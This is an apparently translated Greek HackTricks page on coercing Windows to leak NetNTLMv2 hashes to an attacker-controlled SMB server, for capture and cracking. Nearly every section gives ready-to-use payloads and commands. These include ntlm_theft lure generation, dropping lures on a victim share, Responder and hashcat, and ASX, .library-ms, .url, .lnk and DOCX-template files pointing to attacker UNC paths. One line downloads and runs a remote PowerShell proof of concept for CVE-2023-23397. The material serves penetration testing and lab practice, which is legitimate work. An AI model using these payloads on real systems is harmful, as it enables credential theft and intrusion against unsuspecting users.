# Τοποθεσίες για να κλέψετε NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις εξαιρετικές ιδέες από [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) από τη λήψη ενός microsoft word αρχείου online έως την πηγή ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### SMB share με δικαιώματα εγγραφής + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Αν μπορείτε να **γράψετε σε ένα share που οι χρήστες ή τα προγραμματισμένα jobs περιηγούνται στον Explorer**, αφήστε αρχεία των οποίων τα metadata δείχνουν στο UNC σας (π.χ. `\\ATTACKER\share`). Η απόδοση του φακέλου ενεργοποιεί **implicit SMB authentication** και leaks ένα **NetNTLMv2** προς τον listener σας.

1. **Δημιουργήστε lures** (περιλαμβάνει SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Ρίξτε τα στο writable share** (οποιοσδήποτε φάκελος που ανοίγει το θύμα):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Τα Windows μπορεί να προσπελάσουν πολλά αρχεία ταυτόχρονα· οτιδήποτε προεπισκοπείται από τον Explorer (`BROWSE TO FOLDER`) δεν απαιτεί κλικ.

### Windows Media Player λίστες αναπαραγωγής (.ASX/.WAX)

Αν καταφέρετε να κάνετε έναν στόχο να ανοίξει ή να προεπισκοπήσει μια Windows Media Player λίστα αναπαραγωγής που ελέγχετε, μπορείτε να leak το Net‑NTLMv2 δείχνοντας την εγγραφή σε μια UNC διαδρομή. Το WMP θα προσπαθήσει να ανακτήσει το αναφερόμενο μέσο μέσω SMB και θα αυθεντικοποιηθεί αυτόματα.

Παράδειγμα payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Ροή συλλογής και cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms ενσωματωμένο σε ZIP NTLM leak (CVE-2025-24071/24055)

Το Windows Explorer διαχειρίζεται ανασφαλώς αρχεία .library-ms όταν ανοίγονται απευθείας μέσα από ένα αρχείο ZIP. Εάν ο ορισμός της library δείχνει σε απομακρυσμένο UNC path (π.χ., \\attacker\share), η απλή περιήγηση/εκτέλεση του .library-ms μέσα στο ZIP προκαλεί στον Explorer να απογράψει το UNC και να αποστείλει NTLM authentication προς τον επιτιθέμενο. Αυτό αποδίδει ένα NetNTLMv2 που μπορεί να σπάσει offline ή ενδεχομένως να γίνει relay.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Βήματα λειτουργίας
- Δημιουργήστε το αρχείο .library-ms με το XML παραπάνω (ορίστε το IP/hostname σας).
- Zip it (on Windows: Send to → Compressed (zipped) folder) και παραδώστε το ZIP στον στόχο.
- Εκτελέστε έναν NTLM capture listener και περιμένετε να ανοίξει το θύμα το .library-ms από μέσα στο ZIP.


### Διαδρομή ήχου υπενθύμισης ημερολογίου του Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows επεξεργαζόταν το εκτεταμένο MAPI property PidLidReminderFileParameter σε στοιχεία ημερολογίου. Αν αυτή η ιδιότητα έδειχνε σε UNC path (π.χ., \\attacker\share\alert.wav), το Outlook θα επικοινωνούσε με το SMB share όταν ενεργοποιούνταν η υπενθύμιση, leaking το Net‑NTLMv2 του χρήστη χωρίς κανένα κλικ. Αυτό διορθώθηκε στις 14 Μαρτίου 2023, αλλά εξακολουθεί να είναι εξαιρετικά σχετικό για παλαιά/μη ενημερωμένα περιβάλλοντα και για ανάλυση ιστορικών περιστατικών.

Γρήγορη εκμετάλλευση με PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Πλευρά Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Σημειώσεις
- Το θύμα χρειάζεται μόνο το Outlook for Windows να είναι σε λειτουργία όταν ενεργοποιηθεί η υπενθύμιση.
- Ο leak αποδίδει Net‑NTLMv2 κατάλληλο για offline cracking ή relay (όχι pass‑the‑hash).


### .LNK/.URL βασισμένο σε εικονίδιο zero‑click NTLM leak (CVE‑2025‑50154 – παράκαμψη του CVE‑2025‑24054)

Το Windows Explorer αποδίδει τα εικονίδια συντομεύσεων αυτόματα. Πρόσφατες έρευνες έδειξαν ότι ακόμη και μετά το patch της Microsoft του Απριλίου 2025 για τις συντομεύσεις με UNC‑εικονίδιο, ήταν ακόμη δυνατό να ενεργοποιηθεί η NTLM authentication χωρίς κλικ φιλοξενώντας τον στόχο της συντόμευσης σε UNC διαδρομή και κρατώντας το εικονίδιο τοπικά (παράκαμψη του patch που έλαβε το CVE‑2025‑50154). Η απλή προβολή του φακέλου προκαλεί το Explorer να ανακτήσει metadata από τον απομακρυσμένο στόχο, εκπέμποντας NTLM στον επιτιθέμενο διακομιστή SMB.

Ελάχιστο payload Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Συντόμευση προγράμματος payload (.lnk) μέσω PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ιδέες παράδοσης
- Βάλτε τη συντόμευση σε ένα ZIP και πείστε το θύμα να το περιηγηθεί.
- Τοποθετήστε τη συντόμευση σε ένα εγγράψιμο share που θα ανοίξει το θύμα.
- Συνδυάστε με άλλα αρχεία-δόλωμα στον ίδιο φάκελο, ώστε το Explorer να προεπισκοπεί τα αντικείμενα.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Τα έγγραφα του Office μπορούν να αναφερθούν σε εξωτερικό πρότυπο. Εάν ορίσετε το συνημμένο πρότυπο σε μια UNC διαδρομή, το άνοιγμα του εγγράφου θα πραγματοποιήσει αυθεντικοποίηση στο SMB.

Ελάχιστες αλλαγές στις σχέσεις DOCX (μέσα στο word/):

1) Επεξεργαστείτε το word/settings.xml και προσθέστε την αναφορά στο συνημμένο πρότυπο:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Επεξεργαστείτε word/_rels/settings.xml.rels και ορίστε το rId1337 να δείχνει στο UNC σας:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Επανασυσκευάστε σε .docx και παραδώστε. Τρέξτε τον SMB capture listener σας και περιμένετε το άνοιγμα.

Για ιδέες μετά το capture σχετικά με relaying ή κατάχρηση του NTLM, δείτε:

{{#ref}}
README.md
{{#endref}}


## Αναφορές
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
